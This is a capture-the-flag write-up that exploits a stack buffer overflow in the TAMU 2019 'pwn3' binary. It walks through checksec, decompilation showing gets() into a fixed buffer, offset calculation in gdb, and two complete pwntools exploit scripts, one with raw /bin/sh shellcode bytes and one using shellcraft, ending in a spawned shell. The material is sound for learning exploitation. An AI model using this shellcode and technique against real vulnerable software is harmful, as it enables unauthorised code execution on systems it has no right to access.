### Binary Exploitation

### Source: TAMU_19

### Basic File Checks

```
┌──(venv)─(mark㉿haxor)-[~/…/Pentest/BOF/03-begineer_bof/pwn3]
└─$ file pwn3                                                                                                                                   
pwn3: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=6ea573b4a0896b428db719747b139e6458d440a0, not stripped
                                                                                                                                                                                                                   
┌──(venv)─(mark㉿haxor)-[~/…/Pentest/BOF/03-begineer_bof/pwn3]
└─$ checksec pwn3 
[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)
[*] '/home/mark/Documents/Pentest/BOF/03-begineer_bof/pwn3/pwn3'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
```

Cool we see that its a x86 binay. And the protections in it is just only PIE 

We see that there's no Stack Canary & NX is disabled

So we can inject shellcode to the stack and make it execute

I'll run the binary to know what it does

```
┌──(venv)─(mark㉿haxor)-[~/…/Pentest/BOF/03-begineer_bof/pwn3]
└─$ ./pwn3
Take this, you might need it on your journey 0xffd58f7e!
gosh
```

It prints out an address which looks like its gotten from the stack and exists after we give it input

I'll now decompile it using ghidra 

Here's the main function

```

/* WARNING: Function: __x86.get_pc_thunk.ax replaced with injection: get_pc_thunk_ax */

undefined4 main(void)

{
  undefined *puVar1;
  
  puVar1 = &stack0x00000004;
  setvbuf(stdout,(char *)0x2,0,0);
  echo(puVar1);
  return 0;
}
```

It justs calls the echo() function

Here's the decompiled code

```

/* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */

void echo(void)

{
  char local_12e [294];
  
  printf("Take this, you might need it on your journey %p!\n",local_12e);
  gets(local_12e);
  return;
}
```

So basically here's what's happening

```
1. It prints out an address in the stack
2. It use get as stdin which is stored in a buffer which can only hold up to 294bytes
```

With this, we can cause buffer overflow as using get function is vulnerable and also when injecting shellcode on the stack the address i'll use is the one printed out when the program starts

Now i'll get the offset from where our input is stored and to the rip

Using gdb i'll set a breakpoint on the leave call in echo

```
┌──(venv)─(mark㉿haxor)-[~/…/Pentest/BOF/03-begineer_bof/pwn3]
└─$ gdb -q pwn3
GEF for linux ready, type `gef' to start, `gef config' to configure
90 commands loaded and 5 functions added for GDB 12.1 in 0.01ms using Python engine 3.11
Reading symbols from pwn3...
(No debugging symbols found in pwn3)
gef➤  disass echo
Dump of assembler code for function echo:
   0x0000059d <+0>:     push   ebp
   0x0000059e <+1>:     mov    ebp,esp
   0x000005a0 <+3>:     push   ebx
   0x000005a1 <+4>:     sub    esp,0x134
   0x000005a7 <+10>:    call   0x4a0 <__x86.get_pc_thunk.bx>
   0x000005ac <+15>:    add    ebx,0x1a20
   0x000005b2 <+21>:    sub    esp,0x8
   0x000005b5 <+24>:    lea    eax,[ebp-0x12a]
   0x000005bb <+30>:    push   eax
   0x000005bc <+31>:    lea    eax,[ebx-0x191c]
   0x000005c2 <+37>:    push   eax
   0x000005c3 <+38>:    call   0x410 <printf@plt>
   0x000005c8 <+43>:    add    esp,0x10
   0x000005cb <+46>:    sub    esp,0xc
   0x000005ce <+49>:    lea    eax,[ebp-0x12a]
   0x000005d4 <+55>:    push   eax
   0x000005d5 <+56>:    call   0x420 <gets@plt>
   0x000005da <+61>:    add    esp,0x10
   0x000005dd <+64>:    nop
   0x000005de <+65>:    mov    ebx,DWORD PTR [ebp-0x4]
   0x000005e1 <+68>:    leave  
   0x000005e2 <+69>:    ret    
End of assembler dump.
gef➤  b *echo+68
Breakpoint 1 at 0x620
gef➤  
```

Now i'll run it and give the input as `1234567890`

```
gef➤  r
Starting program: /home/mark/Documents/Pentest/BOF/03-begineer_bof/pwn3/pwn3 
[*] Failed to find objfile or not a valid file format: [Errno 2] No such file or directory: 'system-supplied DSO at 0xf7fc7000'
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Take this, you might need it on your journey 0xffffcebe!
1234567890

Program received signal SIGILL, Illegal instruction.
0x5655561f in main ()


[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0x0       
$ebx   : 0x56556fcc  →  <_GLOBAL_OFFSET_TABLE_+0> aam 0x1e
$ecx   : 0xf7e1e9c4  →  0x00000000
$edx   : 0x1       
$esp   : 0xffffcff0  →  0xffffd010  →  0x00000001
$ebp   : 0xffffcff8  →  0x00000000
$esi   : 0x56555630  →  <__libc_csu_init+0> push ebp
$edi   : 0xf7ffcb80  →  0x00000000
$eip   : 0x5655561f  →  <main+60> lea esp, [ebp-0x8]
$eflags: [zero carry parity adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffcff0│+0x0000: 0xffffd010  →  0x00000001    ← $esp
0xffffcff4│+0x0004: 0xf7e1cff4  →  0x0021cd8c
0xffffcff8│+0x0008: 0x00000000   ← $ebp
0xffffcffc│+0x000c: 0xf7c23295  →   add esp, 0x10
0xffffd000│+0x0010: 0x00000000
0xffffd004│+0x0014: 0x000070 ("p"?)
0xffffd008│+0x0018: 0xf7ffcff4  →  0x00033f14
0xffffd00c│+0x001c: 0xf7c23295  →   add esp, 0x10
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
   0x56555612 <main+47>        add    esp, 0x10
   0x56555615 <main+50>        call   0x5655559d <echo>
   0x5655561a <main+55>        mov    eax, 0x0
 → 0x5655561f <main+60>        lea    esp, [ebp-0x8]
   0x56555622 <main+63>        pop    ecx
   0x56555623 <main+64>        pop    ebx
   0x56555624 <main+65>        pop    ebp
   0x56555625 <main+66>        lea    esp, [ecx-0x4]
   0x56555628 <main+69>        ret    
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "pwn3", stopped 0x5655561f in main (), reason: SIGILL
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x5655561f → main()
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤
```

I'll search for where the input is stored on the stack and the current rip address

```
gef➤  search-pattern 1234567890
[+] Searching '1234567890' in memory
[+] In '[heap]'(0x56558000-0x5657a000), permission=rw-
  0x565581a0 - 0x565581ac  →   "1234567890\n" 
[+] In '[stack]'(0xfffdd000-0xffffe000), permission=rwx
  0xffffcebe - 0xffffcec8  →   "1234567890" 
gef➤  i f
Stack level 0, frame at 0xffffcff0:
 eip = 0x565555e1 in echo; saved eip = 0x5655561a
 called by frame at 0xffffd010
 Arglist at 0xffffcfe8, args: 
 Locals at 0xffffcfe8, Previous frame's sp is 0xffffcff0
 Saved registers:
  ebx at 0xffffcfe4, ebp at 0xffffcfe8, eip at 0xffffcfec
gef➤ 
```

So doing the calculation `(0xffffcfec - 0xffffcebe = 0x12e)` we get the offset as `0x12e`

Now i'll write the exploit since we have everything needed

```
from pwn import *
io = process('./pwn3')

print(io.recvuntil('journey'))
leak = io.recvline()
addr = leak.strip('!\n')
stack_addr = int(addr, 16)

payload = ""
payload += "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80"
payload += b"A"*(0x12e - len(payload))
payload += p32(stack_addr)

io.sendline(payload)

io.interactive()
```

On running it boom we get shell xD

```
┌──(venv)─(mark㉿haxor)-[~/…/Pentest/BOF/03-begineer_bof/pwn3]
└─$ python2 exploit.py
[+] Starting local process './pwn3': pid 36740
Take this, you might need it on your journey
[*] Switching to interactive mode
$ 
$ ls
exploit.py  pwn3
$ id
uid=1000(mark) gid=1000(mark) groups=1000(mark),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),119(wireshark),121(bluetooth),137(scanner),142(kaboxer)
$ whoami
mark
$  
```

## Edited: 
Here's a modified exploit that will genenrate the shellcode using shellcraft 😉

```
from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Set up pwntools for the correct architecture
exe = './pwn3'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Pass in pattern_size, get back EIP/RIP offset
offset = 0x12e
print("Offset at: " +hex(offset))
# Start program
io = start()

# Get the stack address (where out navigation commands will go)
print(io.recvuntil('Take this, you might need it on your journey'))
leak = io.recvline()
addr = leak.strip('!\n')
stack_addr = int(addr, 16)
print("Stack address at: " +hex(stack_addr))


shellcode = asm(shellcraft.sh())
padding = asm('nop') * (offset - len(shellcode))

# Build the payload
payload = flat([
    shellcode,
    padding,
    stack_addr
])

io.sendline(payload)

# spawn a shell
io.interactive()
```
And we're done

<br> <br>
[Back To Home](../../index.md)
                  

